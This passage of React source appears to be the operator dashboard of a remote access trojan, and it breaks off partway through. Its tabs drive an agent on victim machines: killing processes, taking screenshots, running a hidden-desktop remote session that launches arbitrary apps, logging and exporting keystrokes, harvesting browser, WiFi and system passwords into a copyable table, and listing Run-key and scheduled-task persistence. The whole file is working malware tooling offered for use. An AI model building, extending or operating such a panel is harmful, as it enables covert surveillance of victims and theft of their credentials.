
  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
      <div style={S.toolbar}>
        <input type="search" placeholder="Search processes..." value={search} onChange={e => setSearch(e.target.value)}
          style={{ ...S.toolInput, minWidth: 200 }} />
        <div style={{ display: 'flex', gap: 4 }}>
          {['all', 'user', 'system'].map(f => (
            <button key={f} style={{ ...S.toolBtn, ...(filterMode === f ? S.btnSuccess : {}) }}
              onClick={() => setFilterMode(f)}>{f.charAt(0).toUpperCase() + f.slice(1)}</button>
          ))}
        </div>
        <div style={{ flex: 1 }} />
        <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'rgba(255,255,255,0.3)' }}>{processes.length} processes</span>
        <button style={S.toolBtn} onClick={fetchProcesses} disabled={loading}>{loading ? '⏳...' : '↻ Refresh'}</button>
        <button style={{ ...S.toolBtn, ...S.btnDanger }} onClick={() => {
          selectedProcs.forEach(pid => interactSend('task_viewer_kill', { pid }, () => {}));
          showToast(`☠ Killed ${selectedProcs.size} processes`);
          setSelectedProcs(new Set());
        }} disabled={selectedProcs.size === 0}>Kill Selected</button>
      </div>
      <div style={{ flex: 1, overflowY: 'auto', overflowX: isMobile ? 'auto' : 'hidden' }}>
        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
          <thead><tr>
            <th style={{ ...S.th, width: 30 }}><input type="checkbox" style={{ accentColor: 'var(--green)' }}
              onChange={e => {
                if (e.target.checked) setSelectedProcs(new Set(sorted.map(p => p.pid)));
                else setSelectedProcs(new Set());
              }} /></th>
            <th style={S.th} onClick={() => handleSort('pid')}>PID{sortArrow('pid')}</th>
            <th style={S.th} onClick={() => handleSort('name')}>Name{sortArrow('name')}</th>
            {!isMobile && <th style={S.th} onClick={() => handleSort('user')}>User{sortArrow('user')}</th>}
            {!isMobile && <th style={S.th} onClick={() => handleSort('memory_mb')}>Memory{sortArrow('memory_mb')}</th>}
            {!isMobile && <th style={S.th} onClick={() => handleSort('threads')}>Threads{sortArrow('threads')}</th>}
            {isMobile && <th style={{ ...S.th, width: 44 }}>Kill</th>}
          </tr></thead>
          <tbody>
            {loading && processes.length === 0 && (
              <tr><td colSpan={isMobile ? 4 : 6} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>⏳ Waiting for agent response...</td></tr>
            )}
            {sorted.map((p, i) => (
              <tr key={i}
                onContextMenu={e => { e.preventDefault(); setCtx({ x: e.clientX, y: e.clientY, items: procCtxItems(p) }); }}
                onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.03)'}
                onMouseLeave={e => e.currentTarget.style.background = 'transparent'}
                style={{ color: isSystemProc(p) ? 'rgba(255,255,255,0.3)' : undefined }}>
                <td style={S.td}><input type="checkbox" style={{ accentColor: 'var(--green)' }}
                  checked={selectedProcs.has(p.pid)}
                  onChange={e => {
                    const s = new Set(selectedProcs);
                    e.target.checked ? s.add(p.pid) : s.delete(p.pid);
                    setSelectedProcs(s);
                  }} /></td>
                <td style={{ ...S.td, color: 'var(--green)' }}>{p.pid}</td>
                <td style={S.td}>{p.name}</td>
                {!isMobile && <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{p.user || '-'}</td>}
                {!isMobile && <td style={{ ...S.td, color: (p.memory_mb || 0) > 200 ? 'var(--yellow)' : 'rgba(255,255,255,0.7)' }}>
                  {p.memory_mb != null ? p.memory_mb.toFixed ? p.memory_mb.toFixed(1) + ' MB' : p.memory_mb + ' MB' : '-'}
                </td>}
                {!isMobile && <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{p.threads || p.parent_pid || '-'}</td>}
                {isMobile && <td style={S.td}><button style={{ ...S.toolBtn, ...S.btnDanger, padding: '2px 6px', fontSize: 10, minHeight: 44 }} onClick={() => setKillTarget(p)}>☠</button></td>}
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      {ctx && <ContextMenu x={ctx.x} y={ctx.y} items={ctx.items} onClose={() => setCtx(null)} />}
      <ConfirmModal open={!!killTarget} title="CONFIRM KILL PROCESS"
        message={`Kill process "${killTarget?.name}" (PID ${killTarget?.pid})?`}
        confirmLabel="KILL" onConfirm={() => killProcess(killTarget?.pid)} onCancel={() => setKillTarget(null)} />
    </div>
  );
}

/* ========== DISPLAY TAB ========== */
function DisplayTab({ agentId, showToast }) {
  const [captures, setCaptures] = useState([]);
  const takeCapture = () => { api.createTask(agentId, 'display_capture', {}); showToast('📸 Screenshot captured'); };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
      <div style={S.toolbar}>
        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={takeCapture}>📸 Capture Now</button>
        <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: 11 }}>Auto-capture:</span>
        <select style={{ background: '#15171b', border: '1px solid var(--border)', color: '#fff', fontFamily: 'var(--font-mono)', fontSize: 11, padding: '4px 8px', outline: 'none' }}>
          <option value="off">Off</option><option value="10">10s</option><option value="30">30s</option><option value="60">60s</option>
        </select>
        <div style={{ flex: 1 }} />
        <span style={{ color: 'rgba(255,255,255,0.3)', fontSize: 11, fontFamily: 'var(--font-mono)' }}>Captures: {captures.length}</span>
      </div>
      <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#0a0c10', borderBottom: '1px solid var(--border)', minHeight: 300 }}>
        <div style={{ textAlign: 'center', color: 'rgba(255,255,255,0.3)', fontSize: 13, fontFamily: 'var(--font-mono)' }}>
          <div style={{ fontSize: 48, marginBottom: 10, opacity: 0.3 }}>🖥</div>
          <div>Click Capture to take a screenshot</div>
        </div>
      </div>
      <div style={{ display: 'flex', gap: 8, padding: '10px 12px', overflowX: 'auto', background: '#1f2228', flexShrink: 0 }}>
        {captures.length === 0 && [0, 1, 2].map(i => (
          <div key={i} style={{ width: 120, height: 72, background: '#15171b', border: '1px solid var(--border)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'rgba(255,255,255,0.3)', fontSize: 10, fontFamily: 'var(--font-mono)', flexShrink: 0 }}>EMPTY</div>
        ))}
      </div>
    </div>
  );
}

/* ========== REMOTE DESKTOP TAB ========== */
function RemoteDesktopTab({ agent, showToast }) {
  const [mode, setMode] = useState('watch');
  const [session, setSession] = useState(null);
  const [connected, setConnected] = useState(false);
  const [fps, setFps] = useState(0);
  const [error, setError] = useState(null);
  const canvasRef = useRef(null);
  const wsRef = useRef(null);
  const frameCount = useRef(0);
  const containerRef = useRef(null);

  const startSession = async () => {
    setError(null);
    try {
      // Create VNC session via API
      const res = await api.vncStart(agent.id, mode);
      const sessionId = res.session_id;
      setSession(res);

      // Send task to agent to start streaming
      await api.createTask(agent.id, 'remote_desktop_start', {
        mode: mode,
        session_id: sessionId,
        _server_url: window.location.origin,
      });

      // Connect panel WebSocket after a short delay for agent to connect
      setTimeout(() => {
        const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const token = localStorage.getItem('sg_token');
        const ws = new WebSocket(`${proto}//${window.location.host}/api/v1/vnc/panel?session_id=${sessionId}&token=${token}`);
        wsRef.current = ws;

        ws.onopen = () => {
          setConnected(true);
          showToast('🖥 Remote desktop connected');
        };

        ws.onclose = () => {
          setConnected(false);
        };

        ws.onerror = () => {
          setError('WebSocket connection failed');
          setConnected(false);
        };

        ws.onmessage = (e) => {
          try {
            const data = JSON.parse(e.data);
            if (data.type === 'frame' && data.data) {
              const img = new Image();
              img.onload = () => {
                const canvas = canvasRef.current;
                if (canvas) {
                  canvas.width = data.width || img.width;
                  canvas.height = data.height || img.height;
                  const ctx = canvas.getContext('2d');
                  ctx.drawImage(img, 0, 0);
                }
              };
              img.src = 'data:image/bmp;base64,' + data.data;
              frameCount.current++;
            }
          } catch {}
        };
      }, 2000);
    } catch (e) {
      setError(e.message || 'Failed to start session');
    }
  };

  const stopSession = async () => {
    if (wsRef.current) {
      try {
        wsRef.current.send(JSON.stringify({ type: 'stop' }));
      } catch {}
      wsRef.current.close();
      wsRef.current = null;
    }
    if (session?.session_id) {
      try {
        await api.vncStop(session.session_id);
      } catch {}
      try {
        await api.createTask(agent.id, 'remote_desktop_stop', {});
      } catch {}
    }
    setSession(null);
    setConnected(false);
    setFps(0);
    frameCount.current = 0;
  };

  // Mouse handler for control/hidden mode
  const handleCanvasClick = (e) => {
    if (mode === 'watch' || !wsRef.current || wsRef.current.readyState !== 1) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const scaleX = canvas.width / rect.width;
    const scaleY = canvas.height / rect.height;
    const x = Math.round((e.clientX - rect.left) * scaleX);
    const y = Math.round((e.clientY - rect.top) * scaleY);
    wsRef.current.send(JSON.stringify({
      type: 'mouse', x, y, button: e.button === 2 ? 'right' : 'left', action: 'click'
    }));
  };

  const handleMouseMove = (e) => {
    if (mode === 'watch' || !wsRef.current || wsRef.current.readyState !== 1) return;
    if (e.buttons === 0) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const scaleX = canvas.width / rect.width;
    const scaleY = canvas.height / rect.height;
    const x = Math.round((e.clientX - rect.left) * scaleX);
    const y = Math.round((e.clientY - rect.top) * scaleY);
    wsRef.current.send(JSON.stringify({
      type: 'mouse', x, y, button: 'left', action: 'move'
    }));
  };

  // Keyboard handler for control/hidden mode
  useEffect(() => {
    if (mode === 'watch' || !connected) return;
    const handleKey = (e) => {
      if (!containerRef.current || !containerRef.current.contains(document.activeElement)) return;
      e.preventDefault();
      e.stopPropagation();
      if (wsRef.current && wsRef.current.readyState === 1) {
        wsRef.current.send(JSON.stringify({
          type: 'key', vk: e.keyCode, action: e.type === 'keydown' ? 'down' : 'up'
        }));
      }
    };
    document.addEventListener('keydown', handleKey, true);
    document.addEventListener('keyup', handleKey, true);
    return () => {
      document.removeEventListener('keydown', handleKey, true);
      document.removeEventListener('keyup', handleKey, true);
    };
  }, [mode, connected]);

  // FPS counter
  useEffect(() => {
    const interval = setInterval(() => {
      setFps(frameCount.current);
      frameCount.current = 0;
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (wsRef.current) {
        wsRef.current.close();
        wsRef.current = null;
      }
    };
  }, []);

  return (
    <div ref={containerRef} tabIndex={0} style={{ display: 'flex', flexDirection: 'column', flex: 1, background: '#0a0c10', outline: 'none' }}>
      {/* Toolbar */}
      <div style={S.toolbar}>
        <div style={{ display: 'flex', gap: 4 }}>
          {['watch', 'control', 'hidden'].map(m => (
            <button key={m} onClick={() => setMode(m)} disabled={connected}
              style={{ ...S.toolBtn, ...(mode === m ? { background: 'rgba(0,255,136,0.15)', borderColor: 'var(--green)', color: 'var(--green)' } : {}) }}>
              {m === 'watch' ? '👁 Watch' : m === 'control' ? '🖱 Control' : '🕶 Hidden'}
            </button>
          ))}
        </div>
        <div style={{ flex: 1 }} />
        {connected && (
          <span style={{ color: 'var(--green)', fontSize: 10, fontFamily: 'var(--font-mono)', display: 'flex', alignItems: 'center', gap: 6 }}>
            <span style={{ width: 6, height: 6, background: 'var(--green)', display: 'inline-block', animation: 'pulse 2s infinite' }} />
            LIVE {fps} FPS
          </span>
        )}
        {error && <span style={{ color: 'var(--red)', fontSize: 10, fontFamily: 'var(--font-mono)' }}>✕ {error}</span>}
        {!connected ? (
          <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={startSession}>▶ START</button>
        ) : (
          <button style={{ ...S.toolBtn, ...S.btnDanger }} onClick={stopSession}>■ STOP</button>
        )}
        {mode === 'hidden' && connected && (
          <button style={S.toolBtn} onClick={() => {
            const cmd = prompt('Run application on hidden desktop:');
            if (cmd && wsRef.current && wsRef.current.readyState === 1) {
              wsRef.current.send(JSON.stringify({ type: 'run', cmd }));
              showToast('▶ Launched on hidden desktop');
            }
          }}>▶ Run App</button>
        )}
      </div>

      {/* Canvas area */}
      <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'auto', padding: 8 }}>
        {connected ? (
          <canvas
            ref={canvasRef}
            onClick={handleCanvasClick}
            onMouseMove={handleMouseMove}
            onContextMenu={(e) => {
              e.preventDefault();
              if (mode !== 'watch' && wsRef.current && wsRef.current.readyState === 1) {
                const canvas = canvasRef.current;
                if (!canvas) return;
                const rect = canvas.getBoundingClientRect();
                const scaleX = canvas.width / rect.width;
                const scaleY = canvas.height / rect.height;
                wsRef.current.send(JSON.stringify({
                  type: 'mouse',
                  x: Math.round((e.clientX - rect.left) * scaleX),
                  y: Math.round((e.clientY - rect.top) * scaleY),
                  button: 'right', action: 'click'
                }));
              }
            }}
            style={{
              maxWidth: '100%', maxHeight: '100%',
              cursor: mode === 'watch' ? 'default' : 'crosshair',
              border: '1px solid var(--border)',
              background: '#000',
            }}
          />
        ) : (
          <div style={{ textAlign: 'center', color: 'rgba(255,255,255,0.3)', fontFamily: 'var(--font-mono)' }}>
            <div style={{ fontSize: 48, marginBottom: 16, opacity: 0.4 }}>🖥</div>
            <div style={{ fontSize: 14, marginBottom: 8 }}>Select mode and click START</div>
            <div style={{ fontSize: 10, maxWidth: 420, lineHeight: 1.6, color: 'rgba(255,255,255,0.2)' }}>
              <span style={{ color: 'rgba(255,255,255,0.4)' }}>👁 Watch</span> — view screen live &nbsp;│&nbsp;
              <span style={{ color: 'rgba(255,255,255,0.4)' }}>🖱 Control</span> — mouse + keyboard &nbsp;│&nbsp;
              <span style={{ color: 'rgba(255,255,255,0.4)' }}>🕶 Hidden</span> — invisible desktop session
            </div>
          </div>
        )}
      </div>

      {/* Status bar */}
      {connected && (
        <div style={{
          display: 'flex', alignItems: 'center', gap: 16, padding: '4px 12px',
          borderTop: '1px solid var(--border)', background: '#1f2228', fontSize: 10,
          fontFamily: 'var(--font-mono)', color: 'rgba(255,255,255,0.4)', flexShrink: 0,
        }}>
          <span>MODE: <span style={{ color: mode === 'hidden' ? 'var(--yellow)' : 'var(--green)' }}>{mode.toUpperCase()}</span></span>
          <span>SESSION: <span style={{ color: 'var(--green)' }}>{session?.session_id || '-'}</span></span>
          <span>FPS: <span style={{ color: fps > 0 ? 'var(--green)' : 'var(--red)' }}>{fps}</span></span>
          {mode !== 'watch' && <span style={{ color: 'var(--yellow)' }}>⚡ Click canvas to focus input</span>}
        </div>
      )}
    </div>
  );
}

/* ========== INPUT LOG TAB ========== */
function InputLogTab({ agentId, showToast }) {
  const [monitoring, setMonitoring] = useState(false);
  const [logs, setLogs] = useState([]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
      <div style={S.toolbar}>
        {monitoring ? (
          <button style={{ ...S.toolBtn, ...S.btnDanger }} onClick={() => { api.createTask(agentId, 'input_monitor_stop', {}); setMonitoring(false); }}>⏹ Stop</button>
        ) : (
          <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => { api.createTask(agentId, 'input_monitor_start', {}); setMonitoring(true); }}>▶ Start</button>
        )}
        {monitoring && <span style={S.tag('var(--green)')}>● RECORDING</span>}
        <input type="search" placeholder="Search keystrokes..." style={{ ...S.toolInput, marginLeft: 8 }} />
        <div style={{ flex: 1 }} />
        <button style={S.toolBtn} onClick={() => showToast('📋 Exported keylog')}>↓ Export</button>
      </div>
      <div style={{ flex: 1, overflowY: 'auto', padding: 12 }}>
        {logs.length === 0 ? (
          <div style={{ color: 'rgba(255,255,255,0.3)', textAlign: 'center', marginTop: 40, fontFamily: 'var(--font-mono)' }}>
            No keystrokes captured. Click Start to begin monitoring.
          </div>
        ) : logs.map((l, i) => (
          <div key={i} style={{ padding: '8px 12px', borderBottom: '1px solid rgba(255,255,255,0.04)', display: 'flex', gap: 12, fontSize: 12, fontFamily: 'var(--font-mono)' }}>
            <span style={{ color: 'rgba(255,255,255,0.3)', minWidth: 70 }}>{l.ts}</span>
            <span style={{ color: '#61afef', minWidth: 160, fontWeight: 500 }}>{l.app}</span>
            <span style={{ color: 'rgba(255,255,255,0.7)' }}>{l.keys}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ========== VAULT TAB ========== */
function VaultTab({ creds, agentId, showToast, isMobile }) {
  const [filter, setFilter] = useState('all');
  const [ctx, setCtx] = useState(null);
  const filtered = filter === 'all' ? creds : creds.filter(c => c.source?.toLowerCase() === filter);

  const harvest = () => { api.createTask(agentId, 'vault_reader', {}); showToast('🔑 Harvesting all credential stores...'); };
  const copy = (text) => { navigator.clipboard.writeText(text).catch(() => {}); showToast('📋 Copied'); };

  const srcColor = (src) => {
    const s = (src || '').toLowerCase();
    if (s === 'chrome') return 'var(--green)';
    if (s === 'firefox') return 'var(--yellow)';
    if (s === 'edge') return '#61afef';
    if (s === 'wifi') return 'rgba(255,255,255,0.7)';
    if (s === 'system') return 'var(--red)';
    return 'var(--green)';
  };

  const credCtxItems = (c) => [
    { label: 'Copy Username', icon: '👤', onClick: () => copy(c.username) },
    { label: 'Copy Password', icon: '🔑', onClick: () => copy(c.password) },
    { label: 'Copy Both', icon: '📋', onClick: () => copy(`${c.username}:${c.password}`) },
    { separator: true },
    { label: 'Open URL', icon: '🔗', onClick: () => window.open(c.url, '_blank') },
  ];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
      <div style={S.toolbar}>
        <div style={{ display: 'flex', gap: 4 }}>
          {['all', 'chrome', 'firefox', 'edge', 'wifi', 'system'].map(f => (
            <button key={f} style={{ ...S.toolBtn, padding: '4px 10px', ...(filter === f ? S.btnSuccess : {}) }}
              onClick={() => setFilter(f)}>{f.charAt(0).toUpperCase() + f.slice(1)}</button>
          ))}
        </div>
        <div style={{ flex: 1 }} />
        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={harvest}>⚷ Harvest Now</button>
        <button style={S.toolBtn} onClick={() => showToast('📋 Exported CSV')}>↓ Export CSV</button>
      </div>
      <div style={{ flex: 1, overflowY: 'auto', overflowX: isMobile ? 'auto' : 'hidden' }}>
        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
          <thead><tr>
            <th style={S.th}>Source</th>{!isMobile && <th style={S.th}>URL / Name</th>}<th style={S.th}>Username</th>
            <th style={S.th}>Password</th>{!isMobile && <th style={S.th}>Harvested</th>}<th style={{ ...S.th, width: 60 }}></th>
          </tr></thead>
          <tbody>
            {filtered.length === 0 ? (
              <tr><td colSpan={isMobile ? 4 : 6} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>No credentials. Click Harvest Now.</td></tr>
            ) : filtered.map((c, i) => (
              <tr key={c.id || i}
                onContextMenu={e => { e.preventDefault(); setCtx({ x: e.clientX, y: e.clientY, items: credCtxItems(c) }); }}
                onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.03)'}
                onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                <td style={S.td}><span style={S.tag(srcColor(c.source))}>{c.source}</span></td>
                {!isMobile && <td style={{ ...S.td, color: '#61afef', maxWidth: 220, overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.url}</td>}
                <td style={S.td}>{c.username}</td>
                <td style={{ ...S.td, color: 'var(--green)', fontWeight: 500, maxWidth: isMobile ? 100 : 'none', overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.password}</td>
                {!isMobile && <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{c.created_at ? new Date(c.created_at).toLocaleTimeString() : '-'}</td>}
                <td style={S.td}><button style={{ ...S.toolBtn, padding: '2px 8px', fontSize: 10, minHeight: 44 }}
                  onClick={() => copy(c.password)}>Copy</button></td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      {ctx && <ContextMenu x={ctx.x} y={ctx.y} items={ctx.items} onClose={() => setCtx(null)} />}
    </div>
  );
}

/* ========== REGISTRY TAB (Split Panel) ========== */
function RegistryTab({ agentId, showToast, isMobile, interactSend }) {
  const [hive, setHive] = useState('HKCU');
  const [regPath, setRegPath] = useState('Software\\Microsoft\\Windows\\CurrentVersion\\Run');
  const [pathInput, setPathInput] = useState('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run');
  const [subkeys, setSubkeys] = useState([]);
  const [values, setValues] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [ctx, setCtx] = useState(null);

  // Tree state for root hives
  const hives = [
    { name: 'HKEY_CURRENT_USER', short: 'HKCU', icon: '👤' },
    { name: 'HKEY_LOCAL_MACHINE', short: 'HKLM', icon: '🖥' },
    { name: 'HKEY_CLASSES_ROOT', short: 'HKCR', icon: '🗂' },
    { name: 'HKEY_USERS', short: 'HKU', icon: '👥' },
  ];

  const parsePath = (fullPath) => {
    const parts = fullPath.split('\\');
    const h = parts[0].replace('HKEY_LOCAL_MACHINE', 'HKLM')
      .replace('HKEY_CURRENT_USER', 'HKCU')
      .replace('HKEY_CLASSES_ROOT', 'HKCR')
      .replace('HKEY_USERS', 'HKU');
    return { hive: h, path: parts.slice(1).join('\\') };
  };

  const browseKey = (fullPath) => {
    const fp = fullPath || pathInput;
    const { hive: h, path: p } = parsePath(fp);
    setHive(h);
    setRegPath(p);
    setPathInput(fp);
    setLoading(true);
    setError(null);
    setSubkeys([]);
    setValues([]);

    // List subkeys
    interactSend('config_store_list', { hive: h, path: p }, (result) => {
      setLoading(false);
      if (result && Array.isArray(result)) {
        setSubkeys(result);
      } else if (result && typeof result === 'string') {
        setError(result);
      } else if (result === null) {
        setError('Timeout: no response from agent');
      }
    });

    // Also read values (name: "*" reads all, but agent reads one at a time)
    // For now we just list subkeys; values come from clicking
    interactSend('config_store_read', { hive: h, path: p, name: '(Default)' }, (result) => {
      if (result && typeof result === 'object' && !Array.isArray(result)) {
        setValues([result]);
      }
    });
  };

  const navigateSubkey = (subkeyName) => {
    const newPath = hive + '\\' + (regPath ? regPath + '\\' : '') + subkeyName;
    setPathInput(newPath);
    browseKey(newPath);
  };

  const regTypeToString = (t) => {
    const types = { 1: 'REG_SZ', 2: 'REG_EXPAND_SZ', 3: 'REG_BINARY', 4: 'REG_DWORD', 7: 'REG_MULTI_SZ', 11: 'REG_QWORD' };
    return types[t] || 'REG_' + t;
  };

  const regCtxItems = [
    { label: 'New Key', icon: '📁', onClick: () => showToast('Not implemented') },
    { label: 'New Value', icon: '➕', onClick: () => showToast('Not implemented') },
    { separator: true },
    { label: 'Delete Key', icon: '🗑', danger: true, onClick: () => showToast('Not implemented') },
  ];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
      <div style={S.toolbar}>
        <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: 11 }}>PATH:</span>
        <input type="text" value={pathInput} onChange={e => setPathInput(e.target.value)}
          onKeyDown={e => e.key === 'Enter' && browseKey()}
          style={{ ...S.toolInput, flex: 1 }} spellCheck="false" />
        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => browseKey()} disabled={loading}>
          {loading ? '⏳' : 'BROWSE'}
        </button>
      </div>
      <div style={S.splitPanel}>
        {!isMobile && (
          <div style={S.splitLeft}>
            <div style={{ padding: 4 }}>
              {hives.map(h => (
              <div key={h.short}>
                <div onClick={() => browseKey(h.short)} style={{
                  padding: '4px 8px', cursor: 'pointer', fontSize: 12, fontFamily: 'var(--font-mono)',
                  color: hive === h.short ? 'var(--green)' : 'rgba(255,255,255,0.7)',
                  background: hive === h.short ? 'rgba(0,255,136,0.08)' : 'transparent',
                }} onMouseEnter={e => { if (hive !== h.short) e.currentTarget.style.background = 'rgba(255,255,255,0.05)'; }}
                   onMouseLeave={e => { if (hive !== h.short) e.currentTarget.style.background = 'transparent'; }}
                   onContextMenu={e => { e.preventDefault(); setCtx({ x: e.clientX, y: e.clientY, items: regCtxItems }); }}>
                  <span style={{ fontSize: 13, marginRight: 6 }}>{h.icon}</span> {h.short}
                </div>
                {hive === h.short && subkeys.map((sk, i) => (
                  <div key={i} onClick={() => navigateSubkey(sk)} style={{
                    padding: '4px 8px', paddingLeft: 24, cursor: 'pointer', color: 'var(--green)', fontSize: 12, fontFamily: 'var(--font-mono)',
                  }} onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.05)'}
                     onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                    📁 {sk}
                  </div>
                ))}
              </div>
            ))}
          </div>
        </div>
        )}
        <div style={S.splitRight}>
          {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, padding: 12 }}>Error: {error}</div>}
          <div style={{ padding: '8px 12px', fontSize: 10, color: 'rgba(255,255,255,0.5)', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', borderBottom: '1px solid var(--border)' }}>
            {hive}\\{regPath}
          </div>
          <div style={{ flex: 1, overflowY: 'auto' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
              <thead><tr>
                <th style={S.th}>Name</th><th style={S.th}>Type</th><th style={S.th}>Data</th>
              </tr></thead>
              <tbody>
                {loading && <tr><td colSpan={3} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>⏳ Loading...</td></tr>}
                {!loading && values.length === 0 && subkeys.length === 0 && (
                  <tr><td colSpan={3} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>Click BROWSE to load</td></tr>
                )}
                {!loading && values.length === 0 && subkeys.length > 0 && subkeys.map((sk, i) => (
                  <tr key={i}><td style={{ ...S.td, color: '#61afef', cursor: 'pointer' }} onClick={() => navigateSubkey(sk)}>📁 {sk}</td>
                    <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>REG_KEY</td>
                    <td style={{ ...S.td, color: 'rgba(255,255,255,0.3)' }}>—</td></tr>
                ))}
                {values.map((v, i) => (
                  <tr key={i} onContextMenu={e => { e.preventDefault(); setCtx({ x: e.clientX, y: e.clientY, items: [
                    { label: 'Copy Data', icon: '📋', onClick: () => { navigator.clipboard.writeText(v.value || ''); showToast('📋 Copied'); } },
                    { separator: true },
                    { label: 'Delete Value', icon: '🗑', danger: true },
                  ]}); }}>
                    <td style={S.td}>{v.name}</td>
                    <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{regTypeToString(v.type)}</td>
                    <td style={{ ...S.td, color: v.type === 4 ? 'var(--yellow)' : 'var(--green)', maxWidth: 400, overflow: 'hidden', textOverflow: 'ellipsis', wordBreak: 'break-all' }}>{v.value}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
      {ctx && <ContextMenu x={ctx.x} y={ctx.y} items={ctx.items} onClose={() => setCtx(null)} />}
    </div>
  );
}

/* ========== PERSISTENCE TAB ========== */
function PersistenceTab({ agentId, showToast, interactSend }) {
  const [entries, setEntries] = useState([]);
  const [loading, setLoading] = useState(false);

  const refresh = () => {
    setLoading(true);
    interactSend('boot_entries_list', {}, (result) => {
      setLoading(false);
      if (result && Array.isArray(result)) {
        setEntries(result);
      } else {
        setEntries([]);
      }
    });
  };

  useEffect(() => { refresh(); }, [agentId]);

  const registry = entries.filter(e => e.type === 'registry');
  const tasks = entries.filter(e => e.type === 'scheduled_task');
  const startup = entries.filter(e => e.type === 'startup_folder');
  const other = entries.filter(e => !['registry', 'scheduled_task', 'startup_folder'].includes(e.type));

  const removePersistence = (entry) => {
    const method = entry.type === 'scheduled_task' ? 'schtask' : entry.type === 'startup_folder' ? 'startup_folder' : 'registry';
    interactSend('boot_entries_remove', { method, name: entry.name, hive: entry.location?.startsWith('HKLM') ? 'HKLM' : 'HKCU' }, (result) => {
      showToast('🗑 Removed');
      setTimeout(refresh, 2000);
    });
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
      <div style={S.toolbar}>
        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => showToast('📌 Add persistence — use Settings tab')}>+ Add Persistence</button>
        <div style={{ flex: 1 }} />
        <button style={S.toolBtn} onClick={refresh} disabled={loading}>{loading ? '⏳...' : '↻ Refresh'}</button>
      </div>
      <div style={{ flex: 1, overflowY: 'auto' }}>
        {/* Registry Run Keys */}
        <div style={S.sectionTitle}>REGISTRY RUN KEYS <span style={S.tag('var(--green)')}>{registry.length} entries</span></div>
        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
          <thead><tr><th style={S.th}>Key Path</th><th style={S.th}>Value Name</th><th style={S.th}>Data</th><th style={{ ...S.th, width: 80 }}></th></tr></thead>
          <tbody>
            {registry.length === 0 && !loading && <tr><td colSpan={4} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>No entries</td></tr>}
            {loading && entries.length === 0 && <tr><td colSpan={4} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>⏳ Loading...</td></tr>}
            {registry.map((e, i) => (
              <tr key={i}>
                <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{e.location}</td>
                <td style={S.td}>{e.name}</td>
                <td style={{ ...S.td, color: '#61afef' }}>{e.value}</td>
                <td style={S.td}><button style={{ ...S.toolBtn, ...S.btnDanger, padding: '2px 8px', fontSize: 10 }}
                  onClick={() => removePersistence(e)}>Remove</button></td>
              </tr>
            ))}
          </tbody>
        </table>

        {/* Scheduled Tasks */}
        <div style={{ ...S.sectionTitle, marginTop: 4 }}>SCHEDULED TASKS <span style={S.tag('var(--green)')}>{tasks.length} entries</span></div>
        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
          <thead><tr><th style={S.th}>Task Name</th><th style={{ ...S.th, width: 80 }}></th></tr></thead>
          <tbody>
            {tasks.length === 0 && <tr><td colSpan={2} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>No tasks</td></tr>}
            {tasks.map((e, i) => (
              <tr key={i}>
                <td style={S.td}>{e.name}</td>
